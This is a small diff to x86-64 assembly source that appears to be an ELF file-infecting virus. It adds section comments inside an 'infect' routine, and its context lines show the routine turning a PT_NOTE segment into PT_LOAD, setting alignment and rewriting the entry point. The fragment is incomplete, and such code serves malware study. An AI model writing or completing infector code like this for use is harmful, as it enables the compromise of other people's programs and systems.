@@ -257,6 +257,7 @@ no_pt_note:
     jmp close
 
 infect:
+    ;;; Edit program header ;;;
     ; Change PT_NOTE segment to PT_LOAD
     xor eax, eax        ; Clear eax
     or eax, 1           ; Set the last 16 bits to 1 (PT_LOAD)
@@ -291,6 +292,8 @@ infect:
     ; Set p_align to 0x1000 (most PT_LOAD segment have P_ALIGN at 0x1000)
     mov rax, 0x1000
     mov [rsi + 48], rax
+
+    ;;; Edit ELF header ;;;
 
     ; Change e_entry to the new one
     mov rsi, buffer
